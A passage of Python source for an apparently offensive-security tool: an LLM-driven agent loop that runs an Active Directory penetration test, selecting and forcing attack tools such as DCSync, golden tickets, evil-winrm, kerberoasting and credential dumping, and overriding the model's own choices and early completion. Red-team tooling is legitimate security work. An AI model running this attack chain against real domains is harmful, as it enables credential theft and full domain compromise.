                info(f"[Agent] Using rule engine next action: {fallback_name}")
                response = SimpleNamespace(choices=[SimpleNamespace(
                    message=SimpleNamespace(
                        content="",
                        tool_calls=[_make_fake_tc(fallback_name, fallback_inputs, round_num)],
                    )
                )])

        msg        = response.choices[0].message
        tool_calls = list(msg.tool_calls or [])

        if msg.content:
            _print_thinking(msg.content)

        # Build assistant turn dict
        assistant_turn = {"role": "assistant", "content": msg.content or ""}
        if tool_calls:
            assistant_turn["tool_calls"] = [
                {"id": tc.id, "type": "function",
                 "function": {"name": tc.function.name,
                              "arguments": tc.function.arguments}}
                for tc in tool_calls
            ]
        messages.append(assistant_turn)

        # ── Critical intel override: _pick_next_tool beats LLM on high-value findings ──
        # When clear attack paths exist (ESC vuln, NT hash, DA, ACL edge, owned machine)
        # the LLM must not wander to low-priority tools. Override it.
        _ntlm_off = SESSION.get("ntlm_disabled", False)
        _cc_now   = SESSION.get("krb5_ccache", "")
        _cc_valid = _ccache_is_valid(_cc_now)
        _cur_intel = _agent_intel()
        _recommended, _rec_inputs = _pick_next_tool(completed_tools, call_counts=tool_call_counts)
        _llm_tool   = tool_calls[0].function.name if tool_calls else ""

        # Define "critical" = there is a concrete exploitation path the agent must take NOW
        _critical_tools = {
            "dcsync_attack", "evil_winrm", "adcs_scan", "gmsa_takeover",
            "force_change_password_pivot", "shadow_credentials_attack",
            "golden_ticket", "pass_the_cert", "windows_privesc_recon",
            "credential_dump", "lateral_movement", "request_tgt",
        }
        _is_critical_rec = _recommended in _critical_tools
        _llm_picked_bad  = (
            _llm_tool
            and _llm_tool != _recommended
            and _llm_tool in completed_tools  # repeating done tool
        )
        _llm_ignoring_critical = (
            _llm_tool
            and _is_critical_rec
            and _llm_tool not in _critical_tools        # LLM picked low-priority
            and _llm_tool != _recommended
            and _llm_tool not in ("nmap_scan", "agent_complete")
        )

        if tool_calls and (_llm_picked_bad or _llm_ignoring_critical):
            tool_calls = [_make_fake_tc(_recommended, _rec_inputs, round_num)]

        # ── Adaptive gate: force request_tgt when proven NTLM-disabled + no ccache ─
        # Do not pivot from nmap/banner hints alone. Normal AD order remains:
        # nmap -> LDAP enum -> Kerberos repair only if auth evidence requires it.
        elif (tool_calls
              and _ntlm_off
              and "enumerate_ldap" in completed_tools
              and not _cc_valid
              and "request_tgt" not in completed_tools
              and SESSION.get("password")
              and _llm_tool not in ("request_tgt", "nmap_scan")):
            dc_ = SESSION.get("dc_ip","")
            dom_= SESSION.get("domain","")
            usr_= SESSION.get("username","")
            pw_ = SESSION.get("password","")
            tool_calls = [_make_fake_tc("request_tgt",
                {"dc_ip": dc_, "domain": dom_, "username": usr_, "password": pw_},
                round_num)]

        # Fallback if no tool called
        elif not tool_calls:
            parsed = _parse_json_tool_call(msg.content or "")
            if parsed:
                name, inputs = parsed
                if name in TOOL_MAP:
                    # If model picks a tool already completed, override with next tool.
                    # Exclude the tool the LLM tried so we don't ricochet straight back
                    # into the same dead branch (root cause of round 17-50 looping).
                    if name in completed_tools:
                        override_name, override_inputs = _pick_next_tool(
                            completed_tools, exclude={name},
                            call_counts=tool_call_counts)
                        pass  # [JSON fallback] hidden
                        tool_calls = [_make_fake_tc(override_name, override_inputs, round_num)]
                    else:
                        pass  # [JSON fallback] hidden
                        tool_calls = [_make_fake_tc(name, inputs, round_num)]

            if not tool_calls:
                no_tool_streak += 1
                if no_tool_streak >= 2:
                    name, inputs = _pick_next_tool(
                        completed_tools, call_counts=tool_call_counts)
                    pass  # [Auto fallback] hidden
                    tool_calls = [_make_fake_tc(name, inputs, round_num)]
                    no_tool_streak = 0
                else:
                    nxt, _ = _pick_next_tool(
                        completed_tools, call_counts=tool_call_counts)
                    messages.append({
                        "role":    "user",
                        "content": (
                            f"CALL A TOOL NOW.\n"
                            f"Completed: {completed_tools}\n"
                            f"Next: {nxt}\n"
                            f"State: {_session_context()}"
                        )
                    })
                    continue

        no_tool_streak = 0

        # Execute — use "tool" role for proper calls, "user" for fallback calls
        is_fallback = tool_calls and tool_calls[0].id.startswith(("fallback_", "auto_"))
        for tc in tool_calls:
            name = tc.function.name
            try:
                inputs = json.loads(tc.function.arguments) if isinstance(
                    tc.function.arguments, str) else (tc.function.arguments or {})
            except Exception:
                inputs = {}
            forced_marker = ""
            if name == "agent_complete":
                override_name, override_inputs, forced_marker = _agent_complete_override(completed_tools)
                if override_name:
                    warn(f"[Completion guard] Blocking premature agent_complete — forcing {override_name}")
                    name = override_name
                    inputs = override_inputs

            # ── Sanitize all inputs before execution ──────────────────────────
            inputs = _sanitize_tool_inputs(name, inputs)

            # ── Dead WinRM principal guard ───────────────────────────────────
            # The model may keep asking for evil_winrm even after a prior round
            # proved that exact principal has no WinRM shell. Block it before
            # dispatch, otherwise completed_tools/retry counters still allow a
            # wasteful same-user loop.
            if name in ("discover_winrm_access", "evil_winrm"):
                _probe_user = (inputs.get("username") or SESSION.get("username", "")).strip()
                _dead_users = list(SESSION.get("winrm_dead_for", []) or [])
                _is_dead_user = any(_same_ad_account(_probe_user, dead) for dead in _dead_users)
                if _is_dead_user:
                    if name not in completed_tools:
                        completed_tools.append(name)
                    override_name, override_inputs = _pick_next_tool(
                        completed_tools,
                        exclude={"discover_winrm_access", "evil_winrm"},
                        call_counts=tool_call_counts,
                    )
                    warn(f"[Dead-path guard] Skipping {name} for '{_probe_user}' "
                         f"— using {override_name}")
                    name = override_name
                    inputs = _sanitize_tool_inputs(name, override_inputs)

            if name == "gmsa_read":
                _probe_user = (inputs.get("username") or SESSION.get("username", "")).strip()
                _dead_users = list(_agent_intel().get("gmsa_read_dead_for", []) or [])
                if any(_same_ad_account(_probe_user, dead) for dead in _dead_users):
                    if name not in completed_tools:
                        completed_tools.append(name)
                    override_name, override_inputs = _pick_next_tool(
                        completed_tools,
                        exclude={"gmsa_read"},
                        call_counts=tool_call_counts,
                    )
                    warn(f"[Dead-path guard] Skipping gmsa_read for '{_probe_user}' "
                         f"— using {override_name}")
                    name = override_name
                    inputs = _sanitize_tool_inputs(name, override_inputs)

            if name == "acl_abuse_scan":
                _probe_user = (inputs.get("username") or SESSION.get("username", "")).strip()
                _dead_users = list(_agent_intel().get("acl_scan_dead_for", []) or [])
                if any(_same_ad_account(_probe_user, dead) for dead in _dead_users):
                    if name not in completed_tools:
                        completed_tools.append(name)
                    override_name, override_inputs = _pick_next_tool(
                        completed_tools,
                        exclude={"acl_abuse_scan"},
                        call_counts=tool_call_counts,
                    )
                    warn(f"[Dead-path guard] Skipping acl_abuse_scan for '{_probe_user}' "
                         f"— using {override_name}")
                    name = override_name
                    inputs = _sanitize_tool_inputs(name, override_inputs)

            # ── Anti-loop guard ───────────────────────────────────────────────
            # If the LLM asks for the *same* (tool, args) it just made — and that
            # tool isn't a legitimate retry candidate — escape to _pick_next_tool
            # so we don't burn rounds on a confirmed dead path (e.g. evil_winrm
            # repeated 45× when the account simply has no WinRM access).
            sig = _stable_args_signature(name, inputs)
            repeat_count = recent_call_sigs.count(sig)
            if (repeat_count >= 1
                    and name not in {"agent_complete"}
                    and (name not in _REPEATABLE_TOOLS or repeat_count >= 2)):
                # Mark as completed to push _pick_next_tool past it
                if name not in completed_tools:
                    completed_tools.append(name)
                # First attempt: ask for an alternative
                override_name, override_inputs = _pick_next_tool(
                    completed_tools, call_counts=tool_call_counts)
                # If the picker keeps returning the same dead-end (very common
                # before this fix because completed_tools dedupes counts), try
                # again excluding the offending tool. Walk up to 3 layers to
                # guarantee progress out of any single branch.
                _exclude: set = {name}
                _walks = 0
                while (override_name and _walks < 3
                       and _stable_args_signature(override_name, override_inputs) == sig):
                    _exclude.add(override_name)
                    override_name, override_inputs = _pick_next_tool(
                        completed_tools, exclude=_exclude,
                        call_counts=tool_call_counts)
                    _walks += 1
                if override_name and _stable_args_signature(override_name, override_inputs) != sig:
                    warn(f"[Anti-loop] {name} repeated with identical args ({repeat_count + 1}x) "
                         f"— overriding with {override_name}")
                    name = override_name
                    inputs = _sanitize_tool_inputs(override_name, override_inputs)
                    sig = _stable_args_signature(name, inputs)
            recent_call_sigs.append(sig)
            recent_call_sigs[:] = recent_call_sigs[-12:]
            # Track real invocation count so _pick_next_tool retry-budget
            # checks (e.g. discover_winrm_access < 2x) actually advance.
            tool_call_counts[name] = tool_call_counts.get(name, 0) + 1

            _print_agent_header(round_num, name)
            _print_tool_args("Inputs", inputs)
            _agent_live_status(f"Dispatching {name}; command output will appear as each command starts...")
            cmd_start = _command_log_index()
            result = dispatch_tool(name, inputs)
            commands = _commands_since(cmd_start)
            _print_tool_commands(name, commands, inputs)
            _print_tool_result(name, result)

            # Save to Markdown report (ANSI already stripped by _run/_list_run)
            md_log.add_round(round_num, name, inputs, result, commands)

            # ── Dead-path tracking ────────────────────────────────────────────
            # discover_winrm_access / evil_winrm cleanly told us this principal
            # has no shell. Persist it on SESSION so _pick_next_tool stops
            # reproposing every WinRM branch for the same user (was the actual
            # cause of the 30+ round identical-call loop).
            _r_lower = (result or "").lower()
            _winrm_dead_signals = (
                "no shell-capable host", "winrmnot accessible", "winrm not accessible",
                "winrm discovery found no shell-capable",
            )
            if name in ("discover_winrm_access", "evil_winrm") and any(
                    s in _r_lower for s in _winrm_dead_signals):
                _probe_user = (inputs.get("username") or SESSION.get("username","")).strip()
                if _probe_user:
                    _dead = list(SESSION.get("winrm_dead_for", []) or [])
                    if not any(_same_ad_account(_probe_user, dead) for dead in _dead):
                        _dead.append(_probe_user)
                        SESSION["winrm_dead_for"] = _dead
                        warn(f"[Dead-path] WinRM marked dead for '{_probe_user}' — "
                             f"future rounds will skip WinRM branches for this user")
            # If repeated probes return network-unreachable, mark the whole
            # target as dead so the picker doesn't endlessly retry enum tools.
            _net_dead_signals = (
                "no route to host", "host seems down", "connection refused",
                "name or service not known",
            )
            _net_hits = sum(1 for s in _net_dead_signals if s in _r_lower)
            if _net_hits >= 1:
                SESSION["network_unreachable_hits"] = (
                    int(SESSION.get("network_unreachable_hits", 0)) + 1)
                if SESSION["network_unreachable_hits"] >= 3 and not SESSION.get("network_unreachable"):
                    SESSION["network_unreachable"] = True
                    warn("[Dead-path] Network unreachable confirmed — host appears down. "
                         "Verify VPN, DNS, and that the box is started.")

            # ── Failure detection ─────────────────────────────────────────────
            tool_error_patterns = (
                "STATUS_LOGON_FAILURE", "invalidCredentials", "Tool error",
                "LOGON_FAILURE", "No credentials provided", "Can't contact LDAP",
                "Unknown authentication method", "no mechanism available",
                "SASL(-4)", "ldap_sasl", "Traceback (most recent",
                "ModuleNotFoundError", "ImportError", "Got error:",
                "socket connection error", "timed out", "ldap3 error",
                "[TIMEOUT after", "No module named", "connection refused",
                "No route to host", "Name or service not known",
                "TGT request failed", "parse_identity",
                "Failure to authenticate with LDAP", "AcceptSecurityContext error",
                "LdapErr:", "Code: 49", "80090302", "KRB_AP_ERR_SKEW",
                "Clock skew too great", "STATUS_USER_SESSION_DELETED",
                "successful bind must be completed", "Kerberos auth to LDAP failed",
                "no authentication methods left", "NoneType' object has no attribute 'execute_cmd'",
                # Transport / access denials that should also trip the loop guard
                "WinRM not accessible", "WinRM skipped", "STATUS_LOGON_DENIED",
                "STATUS_ACCESS_DENIED", "STATUS_NOT_SUPPORTED",
                "Tool skipped", "skipped:",
                "bloodyAD skipped", "gMSA enum failed", "gMSA takeover failed",
                "unrecognized arguments:",
            )
            is_failure = any(p in result for p in tool_error_patterns)
            if is_failure:
                fail_counts[name] = fail_counts.get(name, 0) + 1
                fail_counts["__total__"] = fail_counts.get("__total__", 0) + 1
            else:
                fail_counts[name] = 0
                fail_counts["__total__"] = 0

            # Protected Users / NTLM-blocked accounts return "data 52f" or
            # STATUS_USER_SESSION_DELETED on NTLM bind. Pivot to Kerberos right
            # away instead of burning rounds on doomed NTLM retries.
            _protected_user_signals = (
                "data 52f", "data 52e", "STATUS_USER_SESSION_DELETED",
                "KDC_ERR_PREAUTH_FAILED",
            )
            _ntlm_signal = (
                "invalidCredentials", "STATUS_LOGON_FAILURE",
                "Failure to authenticate with LDAP",
            )
            if ((any(s in result for s in _protected_user_signals)
                     or (any(s in result for s in _ntlm_signal)
                         and not SESSION.get("use_kerberos")))
                    and SESSION.get("password")
                    and "request_tgt" not in completed_tools):
                warn("[Auth repair] NTLM blocked (Protected Users / data 52f) — pivoting to Kerberos")
                cmd_start = _command_log_index()
                tgt_result = dispatch_tool("request_tgt", {
                    "dc_ip": SESSION.get("dc_ip",""),
                    "domain": SESSION.get("domain",""),
                    "username": SESSION.get("username",""),
                    "password": SESSION.get("password",""),
                    "nt_hash": SESSION.get("nt_hash",""),
                })
                tgt_commands = _commands_since(cmd_start)
                _print_tool_commands("request_tgt [AUTO PROTECTED]", tgt_commands, {
                    "dc_ip": SESSION.get("dc_ip",""),
                    "domain": SESSION.get("domain",""),
                    "username": SESSION.get("username",""),
                })
                _print_tool_result("request_tgt [AUTO PROTECTED]", tgt_result)
                md_log.add_round(round_num, "request_tgt [AUTO PROTECTED]", {
                    "dc_ip": SESSION.get("dc_ip",""),
                    "domain": SESSION.get("domain",""),
                    "username": SESSION.get("username",""),
                }, tgt_result, tgt_commands)
                completed_tools.append("request_tgt")
                # Re-allow NTLM-failed enumerators to retry with Kerberos.
                # evil_winrm / lateral_movement are NOT reset here — they loop
                # independently and should only retry when the credential changes.
                # Do not blindly reset adcs_scan: if it already found/exploited
                # ESC, removing it from completed_tools causes a duplicate
                # certipy find/req after request_tgt.
                for retryable in (
                    "enumerate_ldap", "enumerate_shares",
                    "asrep_roast", "kerberoast",
                    "collect_bloodhound", "auto_loot_chain", "acl_abuse_scan",
                ):
                    while retryable in completed_tools:
                        completed_tools.remove(retryable)
                fail_counts.clear()
                recent_call_sigs.clear()

            if (any(s in result for s in ("KRB_AP_ERR_SKEW", "Clock skew too great"))
                    and SESSION.get("password")
                    and "request_tgt" not in completed_tools):
                warn("[Auth repair] Kerberos clock skew detected — requesting TGT with faketime")
                cmd_start = _command_log_index()
                tgt_result = dispatch_tool("request_tgt", {
                    "dc_ip": SESSION.get("dc_ip",""),
                    "domain": SESSION.get("domain",""),
                    "username": SESSION.get("username",""),
                    "password": SESSION.get("password",""),
                    "nt_hash": SESSION.get("nt_hash",""),
                })
                tgt_commands = _commands_since(cmd_start)
                _print_tool_commands("request_tgt [AUTO SKEW]", tgt_commands, {
                    "dc_ip": SESSION.get("dc_ip",""),
                    "domain": SESSION.get("domain",""),
                    "username": SESSION.get("username",""),
                })
                _print_tool_result("request_tgt [AUTO SKEW]", tgt_result)
                md_log.add_round(round_num, "request_tgt [AUTO SKEW]", {
                    "dc_ip": SESSION.get("dc_ip",""),
                    "domain": SESSION.get("domain",""),
                    "username": SESSION.get("username",""),
                    "password": SESSION.get("password",""),
                    "nt_hash": SESSION.get("nt_hash",""),
                }, tgt_result, tgt_commands)
                completed_tools.append("request_tgt")
                for retryable in [
                    "enumerate_ldap", "enumerate_shares",
                    "asrep_roast", "kerberoast",
                    "collect_bloodhound", "auto_loot_chain",
                ]:
                    if retryable in completed_tools:
                        completed_tools.remove(retryable)
                # Retry ADCS only if ADCS itself was the tool that failed from
                # clock skew. A skew observed in SMB/LDAP must not make a
                # successful ADCS scan run twice.
                if name == "adcs_scan" and "adcs_scan" in completed_tools:
                    completed_tools.remove("adcs_scan")

            # Mark as completed whether it succeeded or failed (avoid re-running)
            if name not in completed_tools:
                completed_tools.append(name)
            if forced_marker and forced_marker not in completed_tools:
                completed_tools.append(forced_marker)
            if name == "agent_complete":
                mission_status = inputs.get("status", "complete")
                agent_done = True

            # ── Loop guards ───────────────────────────────────────────────────
            # Guard 1: same tool failing 3x → skip it
            if fail_counts.get(name, 0) >= 3:
                warn(f"[Loop guard] {name} failed {fail_counts[name]}x — skipping")
                fail_counts[name] = 0
                if name not in completed_tools:
                    completed_tools.append(name)

            # Guard 2: total consecutive failures >= 4 → force request_tgt
            if fail_counts.get("__total__", 0) >= 4:
                warn(f"[Loop guard] {fail_counts['__total__']} total consecutive failures — forcing request_tgt")
                fail_counts["__total__"] = 0
                krb = SESSION.get("use_kerberos", False)
                if not krb and SESSION.get("password") and "request_tgt" not in completed_tools:
                    rdc = SESSION.get("dc_ip","")
                    rdom = SESSION.get("domain","")
                    ruser = SESSION.get("username","")
                    rpw = SESSION.get("password","")
                    warn("[Auto] Calling request_tgt to fix authentication...")
                    cmd_start = _command_log_index()
                    tgt_result = dispatch_tool("request_tgt", {
                        "dc_ip": rdc, "domain": rdom,
                        "username": ruser, "password": rpw
                    })
                    tgt_commands = _commands_since(cmd_start)
                    _print_tool_commands("request_tgt [AUTO]", tgt_commands, {
                        "dc_ip": rdc, "domain": rdom, "username": ruser,
                    })
                    _print_tool_result("request_tgt [AUTO]", tgt_result)
                    completed_tools.append("request_tgt")
                    # Clear the loop so agent can continue
                    for stuck in ["enumerate_ldap", "enumerate_shares"]:
                        if stuck in completed_tools:
                            completed_tools.remove(stuck)
                else:
                    # Force next different tool
                    for stuck in ["enumerate_ldap", "adcs_scan"]:
                        if stuck not in completed_tools:
                            completed_tools.append(stuck)

            # Analyze result and build intel brief
            intel = _analyze_result(name, result)
            brief = _build_intel_context(name, result, intel)

            # ── Credential pivot: new hash/owned account → re-allow shell tools ─
            # When a tool produces fresh loot (e.g. gmsa_takeover yields a hash,
            # auto_loot_chain finds creds), reset shell-attempt tools so the next
            # round retries them with the new credential instead of skipping.
            new_loot_keys = set(SESSION.get("loot", {}).keys())
            new_owned = {u.get("user") for u in SESSION.get("owned_users", [])}
            cred_pivot = (
                bool(intel.get("nt_hashes"))
                or bool(intel.get("gmsa_hashes"))
                or bool(intel.get("valid_creds"))
            )
            if cred_pivot:
                # When auto_loot_chain or any tool produces a fresh identity
                # (for example, a service account surfaced from a log file), the new principal
                # almost always has different ACL edges than the original one
                # — the whole point of pivoting. Reset the BloodHound/ACL stack
                # so it re-runs under the new identity instead of skipping.
                # Without this, newly visible ACL/gMSA edges can stay invisible
                # and the takeover path never gets proposed.
                for retryable in ("evil_winrm", "lateral_movement", "test_credential",
                                  "acl_abuse_scan", "collect_bloodhound",
                                  "query_bloodhound_paths", "discover_winrm_access"):
                    while retryable in completed_tools:
                        completed_tools.remove(retryable)
                fail_counts.clear()
                # Drop signatures so anti-loop guard doesn't fight the retry
                recent_call_sigs.clear()
                # Keep dead-path entries for principals already proven bad.
                # New identities will not match those entries, so they can
                # still be tried without reopening old loops.

            # Auto-trigger DCSync if DA detected
            if intel.get("is_da") and "dcsync_attack" not in completed_tools:
                cmd_start = _command_log_index()
                ds_res = dispatch_tool("dcsync_attack", {
                    "dc_ip": SESSION.get("dc_ip",""),
                    "domain": SESSION.get("domain",""),
                    "username": SESSION.get("username",""),
                    "password": SESSION.get("password",""),
                })
                ds_commands = _commands_since(cmd_start)
                completed_tools.append("dcsync_attack")
                _print_tool_commands("dcsync_attack [AUTO]", ds_commands, {
                    "dc_ip": SESSION.get("dc_ip",""),
                    "domain": SESSION.get("domain",""),
                    "username": SESSION.get("username",""),
                })
                _print_tool_result("dcsync_attack [AUTO]", ds_res)

            if (name == "adcs_scan"
                    and SESSION.get("agent_intel", {}).get("adcs_shell_ready")
                    and "evil_winrm_after_adcs" not in completed_tools):
                info("[AUTO] ADCS exploit yielded shell-ready credentials — trying WinRM with Kerberos/hash")
                cmd_start = _command_log_index()
                ew_res = dispatch_tool("evil_winrm", {
                    "dc_ip": SESSION.get("dc_ip",""),
                    "domain": SESSION.get("domain",""),
                    "username": SESSION.get("username",""),
                    "password": SESSION.get("password",""),
                    "nt_hash": SESSION.get("nt_hash",""),
                })
                ew_commands = _commands_since(cmd_start)
                completed_tools.append("evil_winrm_after_adcs")
                _print_tool_commands("evil_winrm [AUTO ADCS]", ew_commands, {
                    "dc_ip": SESSION.get("dc_ip",""),
                    "domain": SESSION.get("domain",""),
                    "username": SESSION.get("username",""),
                })
                _print_tool_result("evil_winrm [AUTO ADCS]", ew_res)
                md_log.add_round(round_num, "evil_winrm [AUTO ADCS]", {
                    "dc_ip": SESSION.get("dc_ip",""),
                    "domain": SESSION.get("domain",""),
                    "username": SESSION.get("username",""),
                    "password": SESSION.get("password",""),
                    "nt_hash": SESSION.get("nt_hash",""),
                }, ew_res, ew_commands)

            # Build a ranked candidate menu for the LLM. The picker is the
            # source of truth for "what makes sense next given current intel";
            # we expose the top 3 so a small model just chooses among them
            # instead of free-forming the same dead call every round.
            menu_lines: list = []
            menu_seen: set = set()
            menu_excl: set = set()
            for _ in range(3):
                try:
                    cand_name, cand_args = _pick_next_tool(
                        completed_tools, exclude=menu_excl,
                        call_counts=tool_call_counts)
                except Exception:
                    cand_name, cand_args = "", {}
                if not cand_name or cand_name in menu_seen:
                    break
                menu_seen.add(cand_name)
                menu_excl.add(cand_name)
                command_hint = _command_preview_for_tool(cand_name, cand_args)[0]
                menu_lines.append(f"  {len(menu_lines)+1}. {cand_name}  command≈{command_hint}")
            menu_block = "NEXT-ACTION MENU (pick exactly one, do not invent others):\n" + (
                "\n".join(menu_lines) if menu_lines else "  (no further candidates — call agent_complete)")

            dead_block = ""
            _wd = list(SESSION.get("winrm_dead_for", []) or [])
            if _wd:
                dead_block += f"\nWinRM dead for: {_wd}"
            if SESSION.get("network_unreachable"):
                dead_block += "\nNetwork unreachable: TARGET HOST IS DOWN — only nmap_scan is meaningful."

            if is_fallback:
                status_line = "FAILED" if is_failure else "SUCCESS"
                messages.append({
                    "role":    "user",
                    "content": (
                        f"[{name}] {status_line}\n"
                        f"{result[:1200]}\n"
                        f"{brief}\n\n"
                        f"Completed: {list(dict.fromkeys(completed_tools))}\n"
                        f"Loot: {list(SESSION.get('loot',{}).keys())}\n"
                        f"Kerberos: {SESSION.get('use_kerberos')} ccache: {SESSION.get('krb5_ccache','')}"
                        f"{dead_block}\n\n"
                        f"{menu_block}"
                    )
                })
            else:
                messages.append({
                    "role":         "tool",
                    "tool_call_id": tc.id,
                    "content":      result[:2500] + "\n" + brief,
                })

        if not is_fallback:
            messages.append({
                "role":    "user",
                "content": (
                    f"Kerberos={SESSION.get('use_kerberos')} | "
                    f"Loot={list(SESSION.get('loot',{}).keys())[:5]} | "
                    f"Owned={[m.get('machine') for m in SESSION.get('owned_machines',[])]}\n"
                    f"Completed: {list(dict.fromkeys(completed_tools))}"
                    f"{dead_block}\n\n"
                    f"{menu_block}"
                )
            })

        try:
            log_path.write_text(json.dumps(
                redact_obj({"model": model, "round": round_num,
                            "completed": completed_tools,
                            "session": _session_context()}),
                indent=2, default=str
            ))
        except Exception:
            pass

    try:
        _print_mission_summary(round_num, mission_status, log_path, md_log)
    except Exception:
        try:
            if md_log and md_log._lines:
                md_log._flush()
                warn(f"Report saved (emergency): {md_log.path}")
        except Exception:
            pass
    _pause_after_agent_summary()


# ══════════════════════════════════════════════════════════════════════════════
#  ANTHROPIC AGENT LOOP
# ══════════════════════════════════════════════════════════════════════════════


# AgentMarkdownLog is imported from modules.agent.logger

def _print_mission_summary(round_num: int, mission_status: str, log_path: Path,
                            md_log: "AgentMarkdownLog | None" = None):
    owned_u = [u.get("user","?") for u in SESSION.get("owned_users",[])]
    owned_m = [m.get("machine","?") for m in SESSION.get("owned_machines",[])]
    findings = SESSION.get("findings", [])
    loot     = SESSION.get("loot", {})

    if md_log:
        findings = dedupe_findings(findings)
        SESSION["findings"] = findings
        md_log.add_summary(round_num, mission_status, findings, owned_u, owned_m, loot)
        success(f"Markdown report → {md_log.path}")

    print(f"\n  {AGENT_PINK}{'═'*68}{RST}")
    print(f"  {AGENT_BLUE}{BOLD}AGENT MISSION:{RST} {AGENT_PINK}{BOLD}{mission_status.upper()}{RST}")
    print(f"  {AGENT_BLUE}Rounds     {RST}: {AGENT_TEXT}{round_num}{RST}")
    print(f"  {AGENT_BLUE}Findings   {RST}: {AGENT_TEXT}{len(findings)}{RST}")
    print(f"  {AGENT_BLUE}Owned users{RST}: {AGENT_TEXT}{owned_u}{RST}")
    print(f"  {AGENT_BLUE}Owned hosts{RST}: {AGENT_TEXT}{owned_m}{RST}")
    print(f"  {AGENT_BLUE}Hashes     {RST}: {AGENT_TEXT}{list(loot.keys())}{RST}")
    print(f"  {AGENT_BLUE}JSON Log   {RST}: {AGENT_TEXT}{log_path}{RST}")
    if md_log:
        print(f"  {AGENT_BLUE}MD Report  {RST}: {AGENT_TEXT}{md_log.path}{RST}")
    print(f"  {AGENT_PINK}{'═'*68}{RST}\n")
    save_session()


def _pause_after_agent_summary():
    """Keep final agent results visible until the operator explicitly exits."""
    pause("[Enter] to return to main menu")


def run_agent(target_ip: str, domain: str, username: str,
              password: str = "", nt_hash: str = "",
              api_key: str = ""):
    """Anthropic Claude agent loop."""
    _check_runtime_ownership()
    if not _HAS_ANTHROPIC:
        error("anthropic package not found.")
        return
    client = anthropic.Anthropic(api_key=api_key or os.environ.get("ANTHROPIC_API_KEY",""))

    # Initialize session
    password = _real_secret(password)
    nt_hash = _real_nt_hash(nt_hash)
    if reset_session_for_target_change(dc_ip=target_ip, domain=domain):
        warn("[Agent] Target/domain changed — cleared previous engagement state")
    _reset_agent_runtime_state()
    SESSION.update({
        "dc_ip":    target_ip,
        "domain":   domain,
        "username": username,
        "password": password,
        "nt_hash":  nt_hash,
    })

    # Wipe per-run agent_runtime FIRST — before validating Kerberos state below,
    # so validation cannot confirm a ccache that cleanup then deletes.
    ts       = datetime.now().strftime('%Y%m%d_%H%M%S')
    _clean_agent_output_for_new_run(ts)

    # Validate Kerberos state (same check as Ollama loop)
    _cc = SESSION.get("krb5_ccache", "")
    if SESSION.get("use_kerberos") and (_cc == "" or not Path(_cc).exists()):
        warn(f"[Agent] Stale ccache '{_cc}' — resetting Kerberos state")
        SESSION["use_kerberos"] = False
        SESSION["krb5_ccache"]  = ""
        os.environ.pop("KRB5CCNAME", None)
    elif _cc and Path(_cc).exists():
        if not _ccache_is_valid(_cc, username, domain):
            warn(f"[Agent] ccache '{_cc}' is expired/invalid — resetting Kerberos state")
            SESSION["use_kerberos"] = False
            SESSION["krb5_ccache"]  = ""
            os.environ.pop("KRB5CCNAME", None)
        else:
            os.environ["KRB5CCNAME"] = _cc
            info(f"[Agent] Valid ccache: {_cc}")

    # Initial user message
    init_msg = (
        f"Begin Active Directory penetration test.\n\n"
        f"CURRENT SESSION STATE:\n{_session_context()}\n\n"
        f"Start with reconnaissance and initial enumeration. "
        f"Think through the kill chain systematically. "
        f"Prioritize: (1) low-hanging fruit, (2) credential discovery in shares, "
        f"(3) Kerberos attacks, (4) ADCS, (5) ACL abuse. "
        f"After each tool call, reason about what you found and what to do next. "
        f"Your goal is Domain Admin."
    )

    messages = [{"role": "user", "content": init_msg}]
    _runtime_path("agent_loot").mkdir(exist_ok=True)
    _runtime_path("agent_loot_chain").mkdir(exist_ok=True)
    log_path = LOG_DIR / f"agent_{ts}.json"
    md_path  = LOG_DIR / f"agent_{ts}.md"
    md_log   = AgentMarkdownLog(md_path, target_ip, domain, MODEL)
    info(f"Markdown report → {md_path}")

    agent_done   = False
    round_num    = 0
    mission_status = "running"
    completed_tools: list = []
    SESSION.setdefault("winrm_dead_for", [])

    while not agent_done and round_num < MAX_ROUNDS:
        round_num += 1

        # Call Claude
        _agent_live_status(f"Round {round_num}: asking Claude model '{MODEL}' for next action...")
        try:
            response = client.messages.create(
                model=MODEL,
                max_tokens=MAX_TOKENS,
                system=SYSTEM_PROMPT,
                tools=TOOLS,
                messages=messages,
            )
        except anthropic.APIError as e:
            error(f"API error: {e}")
            break

        # Log
        log_entry = {
            "round": round_num,
            "stop_reason": response.stop_reason,
            "content": [c.model_dump() if hasattr(c,"model_dump") else str(c)
                        for c in response.content]
        }

        # Process response content
        assistant_content = []
        tool_calls        = []

        for block in response.content:
            if block.type == "text":
                _print_thinking(block.text)
                assistant_content.append({"type": "text", "text": block.text})
            elif block.type == "tool_use":
                tool_calls.append(block)
                assistant_content.append({
                    "type": "tool_use",
                    "id": block.id,
                    "name": block.name,
                    "input": block.input,
                })

        messages.append({"role": "assistant", "content": assistant_content})

        if response.stop_reason == "end_turn" and not tool_calls:
            name, inputs = _pick_next_tool(completed_tools)
            tool_calls = [_make_fake_tc(name, inputs, round_num)]

        # Critical intel override for Claude path (same logic as Ollama path)
        if tool_calls:
            _rec2, _rec2_inputs = _pick_next_tool(completed_tools)
            _llm_tool2 = tool_calls[0].name if hasattr(tool_calls[0], "name") else ""
            _critical_tools2 = {
                "dcsync_attack", "evil_winrm", "adcs_scan", "gmsa_takeover",
                "force_change_password_pivot", "shadow_credentials_attack",
                "golden_ticket", "pass_the_cert", "windows_privesc_recon",
                "credential_dump", "lateral_movement", "request_tgt",
            }
            if (_rec2 in _critical_tools2
                    and _llm_tool2
                    and _llm_tool2 not in _critical_tools2
                    and _llm_tool2 != _rec2
                    and _llm_tool2 not in ("nmap_scan", "agent_complete")):
                tool_calls = [_make_fake_tc(_rec2, _rec2_inputs, round_num)]

        # Execute tools
        tool_results = []
        all_intel    = {}
        for tc in tool_calls:
            tc_name = getattr(tc, "name", None) or tc.function.name
            tc_id = getattr(tc, "id", f"fallback_{round_num}")
            tc_input = getattr(tc, "input", None)
            if tc_input is None:
                try:
                    tc_input = json.loads(tc.function.arguments)
                except Exception:
                    tc_input = {}

            forced_marker = ""
            if tc_name == "agent_complete":
                override_name, override_inputs, forced_marker = _agent_complete_override(completed_tools)
                if override_name:
                    warn(f"[Completion guard] Blocking premature agent_complete — forcing {override_name}")
                    tc_name = override_name
                    tc_input = override_inputs

            tc_input = _sanitize_tool_inputs(tc_name, tc_input)

            if tc_name in ("discover_winrm_access", "evil_winrm"):
                _probe_user = (tc_input.get("username") or SESSION.get("username", "")).strip()
                _dead_users = list(SESSION.get("winrm_dead_for", []) or [])
                if any(_same_ad_account(_probe_user, dead) for dead in _dead_users):
